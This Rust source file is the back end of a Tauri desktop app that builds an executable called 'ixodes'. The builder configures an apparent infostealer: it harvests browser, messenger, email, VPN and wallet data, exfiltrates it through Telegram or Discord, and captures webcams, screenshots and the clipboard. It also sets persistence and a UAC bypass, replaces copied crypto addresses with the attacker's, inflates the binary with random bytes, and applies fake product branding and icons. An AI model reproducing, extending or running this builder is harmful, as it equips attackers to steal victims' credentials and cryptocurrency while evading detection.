use image::GenericImageView;
use serde::{Deserialize, Serialize};
use std::fs;
use std::path::{Path, PathBuf};
use std::process::Command;
use std::time::{SystemTime, UNIX_EPOCH};
use tauri::path::BaseDirectory;
use tauri::{AppHandle, Manager};

#[derive(Serialize)]
struct SettingsFile {
    name: String,
    path: String,
    is_default: bool,
}

#[derive(Serialize)]
struct BuildResult {
    success: bool,
    output: String,
    exe_path: Option<String>,
    moved_to: Option<String>,
}

#[derive(Debug, Deserialize)]
struct BrandingSettings {
    icon_source: Option<String>,
    icon_preset: Option<String>,
    product_name: Option<String>,
    file_description: Option<String>,
    company_name: Option<String>,
    product_version: Option<String>,
    file_version: Option<String>,
    copyright: Option<String>,
}

#[derive(Debug, Deserialize)]
struct RecoverySettings {
    allowed_categories: Vec<String>,
    artifact_key: Option<String>,
    archive_password: Option<String>,
    telegram_token: Option<String>,
    telegram_chat_id: Option<String>,
    discord_webhook: Option<String>,
    capture_screenshots: Option<bool>,
    capture_webcams: Option<bool>,
    capture_clipboard: Option<bool>,
    persistence: Option<bool>,
    uac_bypass: Option<bool>,
    clipper: Option<bool>,
    btc_address: Option<String>,
    eth_address: Option<String>,
    ltc_address: Option<String>,
    xmr_address: Option<String>,
    doge_address: Option<String>,
    dash_address: Option<String>,
    sol_address: Option<String>,
    trx_address: Option<String>,
    ada_address: Option<String>,
    pump_size_mb: Option<u32>,
    blocked_countries: Option<Vec<String>>,
    custom_extensions: Option<Vec<String>>,
    custom_keywords: Option<Vec<String>>,
}

#[derive(Debug, Deserialize)]
struct BuildRequest {
    settings: RecoverySettings,
    branding: Option<BrandingSettings>,
    output_dir: Option<String>,
}

fn ixodes_root() -> Result<PathBuf, String> {
    let manifest_dir = PathBuf::from(env!("CARGO_MANIFEST_DIR"));
    let repo_root = manifest_dir
        .parent()
        .and_then(|parent| parent.parent())
        .ok_or("failed to locate repo root")?;
    Ok(repo_root.join("ixodes"))
}

fn recovery_dir(ixodes_root: &Path) -> PathBuf {
    ixodes_root.join("src").join("recovery")
}

fn defaults_path(ixodes_root: &Path) -> PathBuf {
    recovery_dir(ixodes_root).join("defaults.rs")
}

fn escape_rust_string(value: &str) -> String {
    value.replace('\\', "\\\\").replace('"', "\\\"")
}

fn render_defaults_rs(settings: &RecoverySettings) -> Result<String, String> {
    let valid_categories = [
        "Browsers",
        "Messengers",
        "Gaming",
        "EmailClients",
        "VPNs",
        "Wallets",
        "System",
        "Other",
    ];

    for category in &settings.allowed_categories {
        if !valid_categories.contains(&category.as_str()) {
            return Err(format!("unknown recovery category: {category}"));
        }
    }

    let default_categories = if settings.allowed_categories.is_empty() {
        "None".to_string()
    } else {
        let items = settings
            .allowed_categories
            .iter()
            .map(|category| format!("RecoveryCategory::{category}"))
            .collect::<Vec<_>>()
            .join(", ");
        format!("Some(&[{items}])")
    };

    let default_artifact_key = settings
        .artifact_key
        .as_deref()
        .map(str::trim)
        .filter(|value| !value.is_empty())
        .map(escape_rust_string);

    let default_artifact_key = match default_artifact_key {
        Some(value) => format!("Some(\"{value}\")"),
        None => "None".to_string(),
    };

    let default_capture_screenshots = settings.capture_screenshots.unwrap_or(false);
    let default_capture_webcams = settings.capture_webcams.unwrap_or(false);
    let default_capture_clipboard = settings.capture_clipboard.unwrap_or(false);
    let default_persistence = settings.persistence.unwrap_or(false);
    let default_uac_bypass = settings.uac_bypass.unwrap_or(false);
    let default_clipper = settings.clipper.unwrap_or(false);

    let default_btc = settings.btc_address.as_deref().map(escape_rust_string);
    let default_eth = settings.eth_address.as_deref().map(escape_rust_string);
    let default_ltc = settings.ltc_address.as_deref().map(escape_rust_string);
    let default_xmr = settings.xmr_address.as_deref().map(escape_rust_string);
    let default_doge = settings.doge_address.as_deref().map(escape_rust_string);
    let default_dash = settings.dash_address.as_deref().map(escape_rust_string);
    let default_sol = settings.sol_address.as_deref().map(escape_rust_string);
    let default_trx = settings.trx_address.as_deref().map(escape_rust_string);
    let default_ada = settings.ada_address.as_deref().map(escape_rust_string);
    
    let format_opt = |opt: Option<String>| match opt {
        Some(v) => format!("Some(\"{}\")", v),
        None => "None".to_string(),
    };

    let default_btc_val = format_opt(default_btc);
    let default_eth_val = format_opt(default_eth);
    let default_ltc_val = format_opt(default_ltc);
    let default_xmr_val = format_opt(default_xmr);
    let default_doge_val = format_opt(default_doge);
    let default_dash_val = format_opt(default_dash);
    let default_sol_val = format_opt(default_sol);
    let default_trx_val = format_opt(default_trx);
    let default_ada_val = format_opt(default_ada);

    let default_pump_size_mb = settings.pump_size_mb.unwrap_or(0);

    let default_blocked_countries = if let Some(countries) = &settings.blocked_countries {
        if countries.is_empty() {
            "None".to_string()
        } else {
            let items = countries
                .iter()
                .map(|c| format!("\"{}\"", escape_rust_string(c)))
                .collect::<Vec<_>>()
                .join(", ");
            format!("Some(&[{items}])")
        }
    } else {
        "None".to_string()
    };

    let default_custom_extensions = if let Some(exts) = &settings.custom_extensions {
        if exts.is_empty() {
            "None".to_string()
        } else {
            let items = exts
                .iter()
                .map(|s| format!("\"{}\"", escape_rust_string(s)))
                .collect::<Vec<_>>()
                .join(", ");
            format!("Some(&[{items}])")
        }
    } else {
        "None".to_string()
    };

    let default_custom_keywords = if let Some(kws) = &settings.custom_keywords {
        if kws.is_empty() {
            "None".to_string()
        } else {
            let items = kws
                .iter()
                .map(|s| format!("\"{}\"", escape_rust_string(s)))
                .collect::<Vec<_>>()
                .join(", ");
            format!("Some(&[{items}])")
        }
    } else {
        "None".to_string()
    };

    let default_telegram_token = settings
        .telegram_token
        .as_deref()
        .map(str::trim)
        .filter(|v| !v.is_empty())
        .map(|v| format!("Some(\"{}\")", escape_rust_string(v)))
        .unwrap_or_else(|| "None".to_string());

    let default_telegram_chat_id = settings
        .telegram_chat_id
        .as_deref()
        .map(str::trim)
        .filter(|v| !v.is_empty())
        .map(|v| format!("Some(\"{}\")", escape_rust_string(v)))
        .unwrap_or_else(|| "None".to_string());

    let default_discord_webhook = settings
        .discord_webhook
        .as_deref()
        .map(str::trim)
        .filter(|v| !v.is_empty())
        .map(|v| format!("Some(\"{}\")", escape_rust_string(v)))
        .unwrap_or_else(|| "None".to_string());

    Ok(format!(
        r#"use crate::recovery::task::RecoveryCategory;

pub static DEFAULT_ALLOWED_CATEGORIES: Option<&[RecoveryCategory]> = {default_categories};
pub static DEFAULT_ARTIFACT_KEY: Option<&str> = {default_artifact_key};
pub static DEFAULT_CAPTURE_SCREENSHOTS: bool = {default_capture_screenshots};
pub static DEFAULT_CAPTURE_WEBCAMS: bool = {default_capture_webcams};
pub static DEFAULT_CAPTURE_CLIPBOARD: bool = {default_capture_clipboard};
pub static DEFAULT_PERSISTENCE: bool = {default_persistence};
pub static DEFAULT_UAC_BYPASS: bool = {default_uac_bypass};
pub static DEFAULT_CLIPPER_ENABLED: bool = {default_clipper};
pub static DEFAULT_BTC_ADDRESS: Option<&str> = {default_btc_val};
pub static DEFAULT_ETH_ADDRESS: Option<&str> = {default_eth_val};
pub static DEFAULT_LTC_ADDRESS: Option<&str> = {default_ltc_val};
pub static DEFAULT_XMR_ADDRESS: Option<&str> = {default_xmr_val};
pub static DEFAULT_DOGE_ADDRESS: Option<&str> = {default_doge_val};
pub static DEFAULT_DASH_ADDRESS: Option<&str> = {default_dash_val};
pub static DEFAULT_SOL_ADDRESS: Option<&str> = {default_sol_val};
pub static DEFAULT_TRX_ADDRESS: Option<&str> = {default_trx_val};
pub static DEFAULT_ADA_ADDRESS: Option<&str> = {default_ada_val};
pub static DEFAULT_PUMP_SIZE_MB: u32 = {default_pump_size_mb};
pub static DEFAULT_BLOCKED_COUNTRIES: Option<&[&str]> = {default_blocked_countries};
pub static DEFAULT_CUSTOM_EXTENSIONS: Option<&[&str]> = {default_custom_extensions};
pub static DEFAULT_CUSTOM_KEYWORDS: Option<&[&str]> = {default_custom_keywords};
pub static DEFAULT_TELEGRAM_TOKEN: Option<&str> = {default_telegram_token};
pub static DEFAULT_TELEGRAM_CHAT_ID: Option<&str> = {default_telegram_chat_id};
pub static DEFAULT_DISCORD_WEBHOOK: Option<&str> = {default_discord_webhook};
"#,
        default_categories = default_categories,
        default_artifact_key = default_artifact_key,
        default_capture_screenshots = default_capture_screenshots,
        default_capture_webcams = default_capture_webcams,
        default_capture_clipboard = default_capture_clipboard,
        default_persistence = default_persistence,
        default_pump_size_mb = default_pump_size_mb,
        default_blocked_countries = default_blocked_countries,
        default_custom_extensions = default_custom_extensions,
        default_custom_keywords = default_custom_keywords,
        default_telegram_token = default_telegram_token,
        default_telegram_chat_id = default_telegram_chat_id,
    ))
}

#[tauri::command]
fn list_settings_files() -> Result<Vec<SettingsFile>, String> {
    let ixodes_root = ixodes_root()?;
    let recovery_dir = recovery_dir(&ixodes_root);
    let default_settings = defaults_path(&ixodes_root);

    let entries =
        fs::read_dir(&recovery_dir).map_err(|err| format!("failed to read recovery dir: {err}"))?;

    let mut files: Vec<SettingsFile> = entries
        .filter_map(|entry| entry.ok())
        .filter_map(|entry| {
            let path = entry.path();
            if !path.is_file() {
                return None;
            }
            let file_name = path.file_name()?.to_string_lossy().to_string();
            if !file_name.ends_with(".rs") || (!file_name.contains("settings") && file_name != "defaults.rs") {
                return None;
            }
            let is_default = path == default_settings;
            Some(SettingsFile {
                name: file_name,
                path: path.to_string_lossy().to_string(),
                is_default,
            })
        })
        .collect();

    files.sort_by(|a, b| a.name.cmp(&b.name));
    if files.is_empty() {
        return Err("no settings files found in ixodes/src/recovery".into());
    }

    Ok(files)
}

#[tauri::command]
async fn build_ixodes(app: AppHandle, request: BuildRequest) -> Result<BuildResult, String> {
    tauri::async_runtime::spawn_blocking(move || build_ixodes_sync(app, request))
        .await
        .map_err(|err| format!("build task failed to join: {err}"))?
}

fn build_ixodes_sync(app: AppHandle, request: BuildRequest) -> Result<BuildResult, String> {
    let ixodes_root = ixodes_root()?;
    let recovery_dir = recovery_dir(&ixodes_root);
    let default_settings = defaults_path(&ixodes_root);
    let backup_path = recovery_dir.join("defaults.rs.bak");
    if !backup_path.exists() && default_settings.exists() {
        fs::copy(&default_settings, &backup_path)
            .map_err(|err| format!("failed to back up defaults.rs: {err}"))?;
    }

    let settings_rs = render_defaults_rs(&request.settings)?;
    fs::write(&default_settings, settings_rs)
        .map_err(|err| format!("failed to write defaults.rs: {err}"))?;

    let mut command = Command::new("cargo");
    command
        .arg("build")
        .arg("--release")
        .current_dir(&ixodes_root)
        .env(
            "IXODES_PASSWORD",
            request.settings.archive_password.as_deref().unwrap_or(""),
        );

    if let Some(token) = &request.settings.telegram_token {
        if !token.is_empty() {
            command.env("IXODES_TELEGRAM_TOKEN", token);
        }
    }
    if let Some(chat_id) = &request.settings.telegram_chat_id {
        if !chat_id.is_empty() {
            command.env("IXODES_CHAT_ID", chat_id);
        }
    }
    if let Some(webhook) = &request.settings.discord_webhook {
        if !webhook.is_empty() {
            command.env("IXODES_DISCORD_WEBHOOK", webhook);
        }
    }

    if let Some(branding) = request.branding.as_ref() {
        apply_branding_env(&app, &mut command, branding)?;
    }

    let output = command
        .output()
        .map_err(|err| format!("failed to start cargo build: {err}"))?;

    let mut combined = String::new();
    combined.push_str(&String::from_utf8_lossy(&output.stdout));
    if !output.stderr.is_empty() {
        if !combined.ends_with('\n') {
            combined.push('\n');
        }
        combined.push_str(&String::from_utf8_lossy(&output.stderr));
    }

    if !output.status.success() {
        return Ok(BuildResult {
            success: false,
            output: combined.trim().to_string(),
            exe_path: None,
            moved_to: None,
        });
    }

    let exe_name = if cfg!(windows) {
        "ixodes.exe"
    } else {
        "ixodes"
    };
    let exe_path = ixodes_root.join("target").join("release").join(exe_name);
    if !exe_path.exists() {
        return Ok(BuildResult {
            success: false,
            output: format!(
                "{}\nexpected executable not found: {}",
                combined.trim(),
                exe_path.display()
            ),
            exe_path: None,
            moved_to: None,
        });
    }

    // Server-side Pumping: Inflate the binary size now so it's delivered pre-pumped
    if let Some(pump_mb) = request.settings.pump_size_mb {
        if pump_mb > 0 {
            if let Err(err) = pump_file_on_server(&exe_path, pump_mb) {
                combined = format!("{}\nWarning: server-side pumping failed: {}", combined.trim(), err);
            } else {
                combined = format!("{}\nInfo: binary pumped to {} MB", combined.trim(), pump_mb);
            }
        }
    }

    let moved_to = if let Some(output_dir) = request.output_dir.as_deref().map(str::trim) {
        if output_dir.is_empty() {
            None
        } else {
            let output_path = PathBuf::from(output_dir);
            if output_path.extension().is_some() {
                Some(output_path)
            } else {
                fs::create_dir_all(&output_path)
                    .map_err(|err| format!("failed to create output directory: {err}"))?;
                Some(output_path.join(exe_name))
            }
        }
    } else {
        None
    };

    let moved_to = moved_to.unwrap_or_else(|| {
        std::env::var("USERPROFILE")
            .map(PathBuf::from)
            .or_else(|_| std::env::var("HOME").map(PathBuf::from))
            .map(|home| home.join("Desktop").join(exe_name))
            .unwrap_or_else(|_| PathBuf::from(exe_name))
    });

    if moved_to.exists() {
        fs::remove_file(&moved_to)
            .map_err(|err| format!("failed to remove existing output binary: {err}"))?;
    }

    if let Err(err) = fs::rename(&exe_path, &moved_to) {
        fs::copy(&exe_path, &moved_to)
            .map_err(|copy_err| format!("failed to copy exe to desktop: {copy_err}"))?;
        fs::remove_file(&exe_path)
            .map_err(|remove_err| format!("failed to remove original exe: {remove_err}"))?;
        combined = format!(
            "{}\nmove fallback used (rename failed: {err})",
            combined.trim()
        );
    }

    Ok(BuildResult {
        success: true,
        output: combined.trim().to_string(),
        exe_path: Some(exe_path.to_string_lossy().to_string()),
        moved_to: Some(moved_to.to_string_lossy().to_string()),
    })
}

fn apply_branding_env(
    app: &AppHandle,
    command: &mut Command,
    branding: &BrandingSettings,
) -> Result<(), String> {
    let icon_path = resolve_icon_path(app, branding)?;
    if let Some(icon) = icon_path {
        command.env("IXODES_ICON_PATH", icon.to_string_lossy().to_string());
    }

    set_env_if_present(
        command,
        "IXODES_PRODUCT_NAME",
        branding.product_name.as_deref(),
    );
    set_env_if_present(
        command,
        "IXODES_FILE_DESCRIPTION",
        branding.file_description.as_deref(),
    );
    set_env_if_present(
        command,
        "IXODES_COMPANY_NAME",
        branding.company_name.as_deref(),
    );
    set_env_if_present(
        command,
        "IXODES_PRODUCT_VERSION",
        branding.product_version.as_deref(),
    );
    set_env_if_present(
        command,
        "IXODES_FILE_VERSION",
        branding.file_version.as_deref(),
    );
    set_env_if_present(command, "IXODES_COPYRIGHT", branding.copyright.as_deref());

    Ok(())
}

fn set_env_if_present(command: &mut Command, key: &str, value: Option<&str>) {
    if let Some(value) = value.map(str::trim).filter(|value| !value.is_empty()) {
        command.env(key, value);
    }
}

fn pump_file_on_server(path: &Path, target_mb: u32) -> Result<(), String> {
    use rand::Rng;
    use std::io::{Seek, SeekFrom, Write};

    let target_size = (target_mb as u64) * 1024 * 1024;
    let mut file = fs::OpenOptions::new()
        .read(true)
        .write(true)
        .open(path)
        .map_err(|err| format!("failed to open exe for pumping: {err}"))?;

    let current_size = file
        .metadata()
        .map_err(|err| format!("failed to get metadata: {err}"))?
        .len();

    if current_size >= target_size {
        return Ok(());
    }

    let needed = target_size - current_size;
    file.seek(SeekFrom::End(0))

        .map_err(|err| format!("failed to seek: {err}"))?;

    let mut rng = rand::thread_rng();
    let chunk_size = 1024 * 512;
    let mut remaining = needed;

    while remaining > 0 {
        let to_write = std::cmp::min(remaining, chunk_size as u64) as usize;
        let mut buffer = vec![0u8; to_write];

        let mode = rng.gen_range(0..4);
        match mode {
            0 => {
                rng.fill(&mut buffer[..]);
            }
            1 => {
                let pattern = [0x41, 0x42, 0x43, 0x44, 0x00];
                for i in 0..to_write {
                    buffer[i] = pattern[i % pattern.len()];
                }
            }
            2 => {
                for i in (0..to_write).step_by(16) {
                    if rng.gen_bool(0.1) {
                        buffer[i] = rng.gen();
                    }
                }
            }
            _ => {
                for i in 0..to_write {
                    buffer[i] = rng.gen_range(32..126);
                }
            }
        }

        file.write_all(&buffer)
            .map_err(|err| format!("failed to write pumped data: {err}"))?;
        remaining -= to_write as u64;
    }

    Ok(())
}

fn resolve_icon_path(
    app: &AppHandle,
    branding: &BrandingSettings,
) -> Result<Option<PathBuf>, String> {
    if let Some(source) = branding
        .icon_source
        .as_deref()
        .map(str::trim)
        .filter(|value| !value.is_empty())
    {
        if source.starts_with("http://") || source.starts_with("https://") {
            let bytes = download_icon(source)?;
            let normalized = normalize_icon_from_bytes(&bytes, target_icon_ext())?;
            return Ok(Some(normalized));
        }

        let path = PathBuf::from(source);
        if path.is_dir() {
            if let Some(candidate) = select_icon_from_dir(&path) {
                let normalized = normalize_icon_from_path(&candidate, target_icon_ext())?;
                return Ok(Some(normalized));
            }
            return Ok(None);
        }
        if path.is_file() {
            let normalized = normalize_icon_from_path(&path, target_icon_ext())?;
            return Ok(Some(normalized));
        }
        return Err(format!("icon path not found: {source}"));
    }

    if let Some(preset) = branding
        .icon_preset
        .as_deref()
        .map(str::trim)
        .filter(|value| !value.is_empty())
    {
        if preset == "none" {
            return Ok(None);
        }

        if preset == "tauri-default" {
            let base = PathBuf::from(env!("CARGO_MANIFEST_DIR"));
            let icon_path = if cfg!(windows) {
                base.join("icons").join("icon.ico")
            } else if cfg!(target_os = "macos") {
                base.join("icons").join("icon.icns")
            } else {
                base.join("icons").join("icon.png")
            };
            if icon_path.exists() {
                let normalized = normalize_icon_from_path(&icon_path, target_icon_ext())?;
                return Ok(Some(normalized));
            }
            return Err("tauri default icon not found".into());
        }

        let preset_path = resolve_preset_icon(app, preset)?;
        let normalized = normalize_icon_from_path(&preset_path, target_icon_ext())?;
        return Ok(Some(normalized));
    }

    Ok(None)
}

fn select_icon_from_dir(dir: &Path) -> Option<PathBuf> {
    let candidates = if cfg!(windows) {
        ["icon.ico", "app.ico", "ixodes.ico"]
            .iter()
            .map(|name| dir.join(name))
            .collect::<Vec<_>>()
    } else if cfg!(target_os = "macos") {
        ["icon.icns", "app.icns", "ixodes.icns"]
            .iter()
            .map(|name| dir.join(name))
            .collect::<Vec<_>>()
    } else {
        ["icon.png", "app.png", "ixodes.png"]
            .iter()
            .map(|name| dir.join(name))
            .collect::<Vec<_>>()
    };

    for candidate in candidates {
        if candidate.exists() {
            return Some(candidate);
        }
    }
    None
}

fn download_icon(url: &str) -> Result<Vec<u8>, String> {
    let response =
        reqwest::blocking::get(url).map_err(|err| format!("failed to download icon: {err}"))?;
    if !response.status().is_success() {
        return Err(format!("icon download failed ({})", response.status()));
    }
    let content_type = response
        .headers()
        .get(reqwest::header::CONTENT_TYPE)
        .and_then(|value| value.to_str().ok())
        .map(|value| value.to_string());
    let bytes = response
        .bytes()
        .map_err(|err| format!("failed to read icon response: {err}"))?;

    let _ = icon_extension_from_url(url).or_else(|| {
        content_type
            .as_deref()
            .and_then(icon_extension_from_content_type)
    });

    Ok(bytes.to_vec())
}

fn resolve_preset_icon(app: &AppHandle, preset: &str) -> Result<PathBuf, String> {
    let exts: &[&str] = if cfg!(windows) {
        &["ico", "png"]
    } else {
        &["png"]
    };

    for ext in exts {
        let rel = Path::new("presets").join(format!("{preset}.{ext}"));
        if let Ok(path) = app.path().resolve(&rel, BaseDirectory::Resource) {
            if path.exists() {
                return Ok(path);
            }
        }

        let dev_path = PathBuf::from(env!("CARGO_MANIFEST_DIR")).join(&rel);
        if dev_path.exists() {
            return Ok(dev_path);
        }
    }

    Err(format!(
        "preset icon not found: presets/{}.(ico|png)",
        preset
    ))
}

fn icon_extension_from_url(url: &str) -> Option<String> {
    let trimmed = url.split('?').next().unwrap_or(url);
    let ext = Path::new(trimmed)
        .extension()
        .and_then(|ext| ext.to_str())
        .map(|ext| ext.to_ascii_lowercase())?;
    if ext == "ico" || ext == "icns" || ext == "png" {
        Some(ext)
    } else {
        None
    }
}

fn icon_extension_from_content_type(content_type: &str) -> Option<String> {
    let content_type = content_type.to_ascii_lowercase();
    if content_type.contains("image/x-icon") || content_type.contains("image/vnd.microsoft.icon") {
        Some("ico".to_string())
    } else if content_type.contains("image/icns") {
        Some("icns".to_string())
    } else if content_type.contains("image/png") {
        Some("png".to_string())
    } else {
        None
    }
}

fn target_icon_ext() -> &'static str {
    if cfg!(windows) {
        "ico"
    } else {
        "png"
    }
}

fn normalize_icon_from_path(path: &Path, target_ext: &str) -> Result<PathBuf, String> {
    if let Some(ext) = path.extension().and_then(|ext| ext.to_str()) {
        if ext.eq_ignore_ascii_case("icns") {
            return Err("icns files are not supported yet; provide a 256-512px PNG instead".into());
        }
    }
    let bytes = fs::read(path).map_err(|err| format!("failed to read icon: {err}"))?;
    normalize_icon_from_bytes(&bytes, target_ext)
}

fn normalize_icon_from_bytes(bytes: &[u8], target_ext: &str) -> Result<PathBuf, String> {
    let image = image::load_from_memory(bytes)
        .map_err(|err| format!("failed to decode icon image: {err}"))?;
    let (width, height) = image.dimensions();

    if width != height {
        return Err("icon must be square (same width and height)".into());
    }
    if width < 256 || width > 512 {
        return Err("icon must be between 256x256 and 512x512".into());
    }

    let resized = if width == 256 {
        image
    } else {
        image.resize_exact(256, 256, image::imageops::FilterType::Lanczos3)
    };
    let rgba = resized.to_rgba8();

    let timestamp = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|duration| duration.as_millis())
        .unwrap_or(0);
    let file_name = format!("ixodes-icon-{timestamp}.{target_ext}");
    let path = std::env::temp_dir().join(file_name);

    if target_ext == "ico" {
        let icon = ico::IconImage::from_rgba_data(256, 256, rgba.into_raw());
        let mut dir = ico::IconDir::new(ico::ResourceType::Icon);
        dir.add_entry(ico::IconDirEntry::encode(&icon).map_err(|err| err.to_string())?);
        let mut file =
            fs::File::create(&path).map_err(|err| format!("failed to write icon: {err}"))?;
        dir.write(&mut file)
            .map_err(|err| format!("failed to write ico: {err}"))?;
    } else {
        rgba.save(&path)
            .map_err(|err| format!("failed to write icon: {err}"))?;
    }

    Ok(path)
}

#[cfg_attr(mobile, tauri::mobile_entry_point)]
pub fn run() {
    tauri::Builder::default()
        .plugin(tauri_plugin_opener::init())
        .plugin(tauri_plugin_dialog::init())
        .invoke_handler(tauri::generate_handler![list_settings_files, build_ixodes])
        .run(tauri::generate_context!())
        .expect("error while running tauri application");
}
